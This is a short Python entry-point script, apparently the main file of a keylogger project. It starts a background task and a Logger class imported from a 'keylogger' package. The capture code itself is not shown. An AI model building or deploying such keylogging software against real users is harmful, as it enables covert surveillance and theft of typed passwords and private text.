from keylogger.logger import Logger
from keylogger.background_tasks import BackgroundTask

if __name__ == "__main__":
    background_task_app = BackgroundTask()
    background_task_app.start()
    
    app: Logger = Logger() 
    app.start()

